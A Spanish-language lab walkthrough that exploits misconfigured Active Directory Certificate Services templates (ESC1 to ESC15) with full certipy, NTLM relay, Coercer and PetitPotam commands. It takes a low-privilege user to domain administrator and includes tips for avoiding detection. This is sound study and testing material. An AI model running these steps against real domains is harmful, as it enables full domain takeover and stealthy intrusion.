# Introducción

Servicios de certificados de Active Directory (sus iniciales en ingles **ADCS**) es un rol de Windows server que se utiliza para la gestión de certificados de la infraestructura PKI, que se utiliza tanto como para la autenticación como para las comunicaciones cifradas. Por esto se implementa bastante en las empresas.

En ocasiones una mala configuración de este servicio puede conllevar al compromiso de todo el directorio activo, ya que es posible expedir certificados en nombre de otros usuarios para luego ser impersonados.

Los ataques mas comunes referentes a **ADCS** están relacionados con las configuraciones de las plantillas para la emisión de los certificados. A este tipo de ataque se les conoce con las siglas **ESC**, de escalation, hasta la fecha de 24-01-25 van de el **ESC 1** al **ESC 16**, certipy **ESC 11**,

Se ha utilizado el laboratorio de ludus que ya esta todo montado para solo realizar las pruebas https://ludus.cloud/

En los ejemplos partimos de un usuario de dominio sin permisos, mas que leer los templates, con nombre **domainuser** y como objetivo sera conseguir ser **eco** que es **administrador** del dominio

## ESC 1

Para que una plantilla sea vulnerable a **ESC1** debe cumplir las siguientes características.
- Client Authentication: True
- Enabled: True
- Enrolee Supplies Subject: True
- Requires Management Approval: False
- Authorized Signatures Required: 0

Enumeramos el dominio para ello usamos bloodhound.py

`bloodhound.py -d ludus.domain -v  -c All -u domainuser -p password -c DCOnly -ns 10.2.10.11`

</p>


<p align="center">

Enumeramos los certificados con **certipy**

`certipy find -u domainuser -p password -dc-ip 10.2.10.11`

<p align="center">
   <img src="/assets/img/ADCS_ESC1_1.png">
</p>


En este caso la plantilla con nombre **ESC1** es vulnerable a ESC1, (que sorpresa...)  por lo que podremos expedir un certificado a nombre del usuario que deseemos y luego autenticarnos con el, para ello podemos utilizar certipy.

`certipy req -u USUARIO -p CONTRASEÑA -debug -dc-ip IP_DC -ca NOMBRE_CA -template NOMBRE_TEMPLATE_VULN -ns IP_DNS -upn USUARIO_A_SUPLANTAR`

En nuestro ejemplo seria algo como

`certipy req -u domainuser@ludus.domain -p password -debug -dc-ip 10.2.10.11 -ca ludus-CA -template ESC1 -ns 10.2.10.11 -upn eco@ludus.domain`

Esto genera un certificado para autenticar como eco

`python /home/kali/Tools/PKINITtools/gettgtpkinit.py -dc-ip 10.2.10.11 -cert-pfx ./eco.pfx ludus.domain/eco eco.ccache`

luego podemos usar pass the hash o el ccache generado o con pkinit o con certipy para autentica

En ocasiones la autenticacion con **pkinit** puede estar monitorizada, al igual que **pass the hash**, y generar alertas, para evitar ser detectado puedes conseguir una shell de **ldap-shell** evitando autenticar por **pkinit** con

`certipy auth -pfx eco.pfx -debug -dc-ip 10.2.10.11 -ns 10.2.10.11 -ldap-shell -ldap-scheme ldaps`

## ESC 2
Una plantilla es vulnerable a **ESC2** si tiene las siguientes caracteristicas
- Low Privilege Users Granted Enrollment Rights 
- Signatures Required: 0 
- Enabled: True 
- Requires Management Approval: False 
- Any Purpose: True **OR** Extended Key Usage: False

<p align="center">
   <img src="/assets/img/ADCS_ESC2_1.png">
</p>

Esta configuración permite a un usuario con privilegios bajos expedir un certificado, sin necesidad de aprobación por usuarios privilegiados, con el motivo que desee, ya sea cifrar comunicaciones, firmar ejecutables, para autenticarse, etcétera.

Para explotar esta template vulnerable, usaremos certipy haciendo que el usuario **domainuser**, el cual no tiene privilegios, consiga autenticarse como **eco** el cual es administrador del dominio, como vimos en el ejemplo anterior.

para esto lo primero que necesitamos es un certificado pfx, podemos usar el mismo template vulnerable, mientras nos deje crear un certificado valdria

`certipy req -u domainuser@ludus.domain -p password -debug -dc-ip 10.2.10.11 -target 10.2.10.11 -ca ludus-CA -template ESC2 -ns 10.2.10.11`

<p align="center">
   <img src="/assets/img/ADCS_ESC2_2.png">
</p>

Después usaremos ese certificado para hacer el **-on-behalf-of** sobre el usuario de **eco**

`certipy req -u domainuser@ludus.domain -p password -debug -dc-ip 10.2.10.11 -target 10.2.10.11 -ca ludus-CA -template ESC2 -ns 10.2.10.11 -on-behalf-of ludus.domain\eco -pfx ./domainuser.pfx`

<p align="center">
   <img src="/assets/img/ADCS_ESC2_3.png">
</p>

Esto genera un certificado que podemos usar para autenticarnos como eco

`certipy auth -pfx eco.pfx -debug -dc-ip 10.2.10.11 -ns 10.2.10.11`

<p align="center">
   <img src="/assets/img/ADCS_ESC2_4.png">
</p>

## ESC 3
El ESC3 tiene que tener en el campo **Extended Key Usage** el valor **Certificate Request Agent** ademas de las siguientes caracteristicas

- Low-Privilege Users Granted Enrollment Rights 
- Signatures Required: 0 
- Enabled: True 
- Requires Management Approval: False 
- Extendede Key Usage: Certificate Request Agent

<p align="center">
   <img src="/assets/img/ADCS_ESC3_1.png">
</p>

La explotacion de esta template vulnerable es similar a la de **ESC2** por lo que primero generaremos un pfx, con la misma template, por ejemplo, y luego lo usaremos para generara un certificado

`certipy req -u domainuser@ludus.domain -p password -debug -dc-ip 10.2.10.11 -target 10.2.10.11 -ca ludus-CA -template ESC3_CRA -ns 10.2.10.11`

<p align="center">
   <img src="/assets/img/ADCS_ESC3_2.png">
</p>

luego usaremos el mismo comando que para **ESC2** lo que generará un pfx de **eco** que podremos usar para autenticarnos con 

`certipy req -u domainuser@ludus.domain -p password -debug -dc-ip 10.2.10.11 -target 10.2.10.11 -ca ludus-CA -template ESC3_CRA -ns 10.2.10.11 -on-behalf-of ludus.domain\eco -pfx ./domainuser.pfx`

<p align="center">
   <img src="/assets/img/ADCS_ESC3_3.png">
</p>

Con ese pfx del usuario **eco** nos autneticaremos

`certipy auth -pfx eco.pfx -debug -dc-ip 10.2.10.11 -ns 10.2.10.11`

<p align="center">
   <img src="/assets/img/ADCS_ESC3_4.png">
</p>

## ESC 4
Para que una plantilla sea vulnerable a ESC4 debe cumplir estas características
- Ser el propietario de la template 
- Tener permisos de WriteOwnerPrincipals
- Tener permisos de WriteDaclPrincipals
- Tener permisos de WritePropertyPrincipals

<p align="center">
   <img src="/assets/img/ADCS_ESC4_1.png">
</p>

Esto nos permitirá modificar la plantilla como deseemos, por esto lo que haremos es modificarla para que sea vulnerable a **ESC1** y luego explotarla como tal, para esto podemos utilizar certipy, primero realizaremos una copia con `-save-old`

`certipy template -u domainuser@ludus.domain -p password -template ESC4 -dc-ip 10.2.10.11 -save-old`

<p align="center">
   <img src="/assets/img/ADCS_ESC4_2.png">
</p>


Este comando ya actualiza la plantilla indicada por una vulnerable a ESC1 y ademas guarda una copia para revertir, si ahora enumeramos la plantilla con nombre **ESC4** veremos que es vulnerable a **ESC1**

<p align="center">
   <img src="/assets/img/ADCS_ESC4_3.png">
</p>

Ahora debemos ejecutar el ataque para **ESC1**

`certipy req -u domainuser@ludus.domain -p password -debug -dc-ip 10.2.10.11 -ca ludus-CA -template ESC4 -ns 10.2.10.11 -upn eco@ludus.domain`

`certipy auth -pfx eco.pfx -debug -dc-ip 10.2.10.11 -ns 10.2.10.11`

Y ya solo usar el certificado creado  con

```
export KRB5CCNAME=/home/kali/LAB/ESC4/eco.ccache
smbclient.py eco@CULO-DC01-2022 -k -no-pass
```

<p align="center">
   <img src="/assets/img/ADCS_ESC4_4.png">
</p>

## ESC 6
Esta vulnerabilidad es a nivel de servidor, de la CA, para que sea vulnerable a esto debe tener EDITF_ATTRIBUTESUBJECTALTNAME2 habilitado

<p align="center">
   <img src="/assets/img/ADCS_ESC6_1.png">
</p>

Al tener el atributo EDITF_ATTRIBUTESUBJECTALTNAME2 permite que se añadan valores personalizados en el campo Subject Alternative Name (SAN) de un certificado.
Al especifica el SAN, un usuario mal intencionado podría autenticarse como cualquier usuario, incluidos los administradores de dominio.

Para esto usaremos certipy y una plantilla cualquiera, por ejemplo "USER" y usurparemos el usuario **eco** administrador del dominio

`certipy req -ca ludus-CA -dc-ip 10.2.10.11 -u domainuser -p password -template  User -target culo-DC01-2022.ludus.domain -upn eco@ludus.domain`

<p align="center">
   <img src="/assets/img/ADCS_ESC6_2.png">
</p>


## ESC 7

Para que este ataque pueda realizarse es necvesario un usuario debe tener permisos de **manage certificate authority(CA)** y permisos para administrar certificados. 

<p align="center">
   <img src="/assets/img/ADCS_ESC7_1.png">
</p>

Con los permisos **manage certificate authority(CA)** puedes añadir un usuario como nuevo officer, con certipy, para esto usaremos a **miliki** y pondremos a **miliki** como new officer

`certipy ca -ca ludus-CA -dc-ip 10.2.10.11 -u miliki -p culo123. -add-officer miliki -debug`

<p align="center">
   <img src="/assets/img/ADCS_ESC7_2.png">
</p>


Para realizar el ataque será necesario que la plantilla **SubCA** este habilitada y tenga habilitada la opcion de probar por un administrador

<p align="center">
   <img src="/assets/img/ADCS_ESC7_3.png">
</p>

intentamos expedir un certificado y dará el siguiente error y un id

`certipy req -ca ludus-CA -dc-ip 10.2.10.11 -u miliki -p culo123. -template SubCA -target culo-DC01-2022.ludus.domain -upn eco@ludus.domain`

<p align="center">
   <img src="/assets/img/ADCS_ESC7_4.png">
</p>

ahora con nuestro officer podemos solventra el problema con el comando de certipy

`certipy ca -ca ludus-CA -dc-ip 10.2.10.11 -u miliki -p culo123. -issue-request 43`

<p align="center">
   <img src="/assets/img/ADCS_ESC7_5.png">
</p>

luego con **-retrieve** y el id de la petición anterior podemos generar el certificado y luego utilizarlo de la forma habitual.

`certipy req -ca ludus-CA -dc-ip 10.2.10.11 -u miliki -p culo123. -template SubCA -target culo-DC01-2022.ludus.domain -upn eco@ludus.domain -retrieve 43`

<p align="center">
   <img src="/assets/img/ADCS_ESC7_6.png">
</p>
## ESC 8
Esta vulnerabilidad afecta a la configuración de la CA, para ser vulnerable a **ESC8** tiene que tener permitido la autenticacion via Web por NTLM y necesitamos una plantilla que tenga la posibilidad de *Enrrolarse* con cuntas maquinas, en nuestro ejemplo usaremos la plantilla con nombre **ESC8**.

<p align="center">
   <img src="/assets/img/ADCS_ESC8_1.png">
</p>

<p align="center">
   <img src="/assets/img/ADCS_ESC8_1_1.png">
</p>

Solicitando las cabeceras ofrecidos por el servicio WEB de la CA, en el recurso **certsrv** podremos ver que utiliza la autenticación NTLM en la web

<p align="center">
   <img src="/assets/img/ADCS_ESC8_2.png">
</p>

El ataque consiste en realizar obligar a un usuario a realizar una atuenticación NTLM(coerce) contra una maquina controlada por el atacante, y de esta forma obtener los hashes "engañados"

Para ello utilizaremos la opcion **relay** de certipy para simular el servidor y obtener los hashes, deberemos indicar una plantilla que exista, en este caso usaremos la plantilla **Workstation**, luego usaremos **petipotam** o **coerce** para "obligar" a los usuarios a loguear.

`certipy relay -target culo-DC01-2022.ludus.domain -template "ESC8"`

<p align="center">
   <img src="/assets/img/ADCS_ESC8_3.png">
</p>

También puede utilizarse **ntlmrelayx**

`sudo $(which ntlmrelayx.py) -t https://culo-DC01-2022.ludus.domain/certsrv/certfnsh.asp -smb2support --adcs --template "ESC8" `

<p align="center">
   <img src="/assets/img/ADCS_ESC8_4.png">
</p>

Para la parte del coerce la configuración sera la ip *10.2.99.1* seria nuestra Kali, donde estará el listener para capturar lo hash, mientras que la CA seria la ip *10.2.10.11*

Con **coerce** el ataque se ejacutaría con algo similar a 

`coercer coerce -u domainuser -p password -d ludus.domain --dc-ip 10.2.10.11 -l 10.2.99.1 -t 10.2.10.11`

<p align="center">
   <img src="/assets/img/ADCS_ESC8_5.png">
</p>

Con la opción `--always-continue` de coerce realiza todas las peticiones de forma continua, esto puede generara alertas de seguridad, por lo que es mejor ir probando las funciones RPC de una en una hasta obtener el certificado de la maquina objetivo

Para **petiPotam** sería

`python PetitPotam.py 10.2.99.1 10.2.10.11 -u domainuser -p password` 

<p align="center">
   <img src="/assets/img/ADCS_ESC8_6.png">
</p>

Con esto obligamos a la cuenta **target**, en este caso cuenta maquina del DC, a auntenticarse contra nuestra maquina, por lo que obtenemos el hash y/o el certificado de esa maquina que podemos utilizar para autenticarnos.
## ESC 9 y ESC 10
Esta plantilla vulnerable solo es util si *StrongCertificateBindingEnforcement* no esta a 2,, ya que permite abusar de la configuracion de mapeo para Kerveros o Schannel lo que le hace vulnerable tanto a **ESC9** como a **ESC10**, ya que para **ESC10** necesita que *StrongCertificateBindingEnforcement* sea 0, para Schannel necesita que *CertificateMappingMethods* sea `UPN`

<p align="center">
   <img src="/assets/img/ADCS_ESC9_1.png">
</p>

Para abusar del **ESC9** necesitamos un usuario con permisos permisos *GenericWrite* sobre un usuario que pueda solicitar este certificado, no podemos ser nosotros mismos

<p align="center">
   <img src="/assets/img/ADCS_ESC9_2.png">
</p>

Por esto le damos permisos a **domainuser** sobre **miliki**, necesitamos esto para modificar el **upn**, de la siguiente forma, *Importante en el upn no poner el dominio solo el nombre del ususario*

`certipy account update -u domainuser@ludus.domain -p password -user miliki -upn Administrator -debug`

<p align="center">
   <img src="/assets/img/ADCS_ESC9_3.png">
</p>

En este caso **miliki** tiene como upn **Administrator**, ahora debemos solicitar un certificado para autenticarnos con **miliki** y veremos lo que ocurre

`certipy req -u miliki@ludus.domain -p culo123. -ca ludus-CA -template ESC9  -debug`

<p align="center">
   <img src="/assets/img/ADCS_ESC9_4.png">
</p>

Después , antes de autenticarnos, debemos cambiar el UPN de **miliki** por el suyo, si nos dará error, *en este caso si introducimos el dominio*

`certipy account update -u domainuser@ludus.domain -p password -user miliki -upn miliki@ludus.domain -debug`

Luego ya si podemos autenticarnos como administrator

`certipy auth -pfx ./administrator.pfx -debug -dc-ip 10.2.10.11 -ns 10.2.10.11 -debug -domain ludus.domain`

<p align="center">
   <img src="/assets/img/ADCS_ESC9_5.png">
</p>

<p align="center">
   <img src="/assets/img/ADCS_ESC9_6.png">
</p>

El ESC10 puede explotarse de manera similar, incluso se puede crear para cuentas maquinas, por ejemplo

`certipy account update -u domainuser@ludus.domain -p password -user miliki -upn 'culo-DC01-2022$@ludus.domain -debug`

<p align="center">
   <img src="/assets/img/ADCS_ESC10_1.png">
</p>

Luego solicitamos el certificado, nos lo da para la cuenta maquina

`certipy req -ca ludus-CA -dc-ip 10.2.10.11 -u miliki -p culo123.`


<p align="center">
   <img src="/assets/img/ADCS_ESC10_2.png">
</p>

volvemos a dejar el UPN del usuario con el suyo 

` certipy account update -u domainuser@ludus.domain -p password -user miliki -upn 'miliki@ludus.domain' -debug`


<p align="center">
   <img src="/assets/img/ADCS_ESC10_3.png">
</p>

Y autenticamos con el certificado de la cuenta maquina

`certipy auth -pfx ./culo-dc01-2022.pfx -debug -dc-ip 10.2.10.11 -ns 10.2.10.11 -debug -domain ludus.domain`

## ESC 13
Esta plantilla vulnerable configura una plantilla, mediante la Issuance Policy, a revés del OID y un grupo del dominio, al expedir un certificado con estas características el usuario autenticado heredará los permisos de dicho grupo, además de esto tiene que cumplir, que :
- La plantilla tiene que tener el **Extended Key Usage (EKU)** con el valor **Client Authentication**
- La plantilla tiene que tener la extensión de Issuance Policies configurada

Para ver los grupos a los que pertenece **miliki** podemos usar `ldapsearch`
`ldapsearch -x -o ldif-wrap=no -E pr=1000/noprompt -b "DC=ludus, DC=domain" -H ldap://10.2.10.11 -D "domainuser@ludus.domain" -w "password" "(&(objectClass=user)(name=miliki))" name sAMAccouintName memberOf`
<p align="center">
   <img src="/assets/img/ADCS_ESC13_2.png">
</p>

Para ver el EKU podemos usar el certipy
`certipy find -u domainuser -p password -dc-ip 10.2.10.11`

<p align="center">
   <img src="/assets/img/ADCS_ESC13_1.png">
</p>


Para conocer si la template tiene asignada el **Issuance Policies** se puede usar 
`ldapsearch -x -o ldif-wrap=no -E pr=1000/noprompt -H ldap://10.2.10.11 -D "domainuser@ludus.domain" -w "password"  -b "CN=Certificate Templates,CN=Public Key Services, CN=Services, CN=Configuration,DC=ludus,DC=domain" "(cn=ESC13)" issuancePolicy`

También se puede ver a través del servidor

<p align="center">
   <img src="/assets/img/ADCS_ESC13_3.png">
</p>

Solicitamos con un usuario un certificado con esa plantilla
`certipy req -ca ludus-CA -dc-ip 10.2.10.11 -template ESC13 -debug -u miliki -p culo123.`

<p align="center">
   <img src="/assets/img/ADCS_ESC13_4.png">
</p>
Después con gettgtpkinit de PKINITtools, pedimos el tgt y luego utilizamo el ccache para autenteicarnos
`python /home/kali/Tools/PKINITtools/gettgtpkinit.py -cert-pfx ./miliki.pfx -pfx-pass ''  -dc-ip 10.2.10.11 ludus.domain/miliki miliki.ccache`

<p align="center">
   <img src="/assets/img/ADCS_ESC13_5.png">
</p>



## ESC 15
Esta plantilla vulnerable aprovecha la `Application policies`  de las plantillas de version 1, por lo que para la plantilla sea vulnerable a esto deberá ser de la versión 1 además de, tener el `server autentication` en ligar del `client autentication`, además usuario no privilegiados podran realizar la ccion de enrollment sin ser aprovado por los administradores

<p align="center">
   <img src="/assets/img/ADCS_ESC15_1.png">
</p>

Con esta configuración podremos hacer un request del certificado con esa plantilla e indicarle el OID de una `application-policies` que sepamos que hace vulnerable a la plantilla, por ejemplo el OID `1.3.6.1.4.1.311.20.2.1` volvería a la plantilla vulnerable a ESC2 y/o ESC3, esto podemos hacerlo con certipy

`certipy req -ca ludus-CA -dc-ip 10.2.10.11 -u domainuser -p password -template  ESC15 -target culo-DC01-2022.ludus.domain -upn eco@ludus.domain --aplication-policies "1.3.6.1.4.1.311.20.2.1"`

Esto nos genera un pfx del usuario administrador eco, recordad que esto solo sera valido para conexiones schanel, no podrá usarse con PKInit

`certipy auth -pfx ./eco.pfx -dc-ip 10.2.10.11 -ldap-shell`

### **Troubleshooting**
** Se encontró un fallo de desajuste de tiempo, para solventarlo en nuestra kali debemos configurar la misma hora que en el DC o el servidor ntp que utilicen, para ello podemos ejecutar
```
sudo timedatectl set-ntp off
sudo rdate -n 10.2.10.11
```

Importante cuando se utilice la autenticación por kerberos (-k -no-pass) debe utilizarse los nombres de host en vez de IPs, de lo contrario no funcionara correctamente.
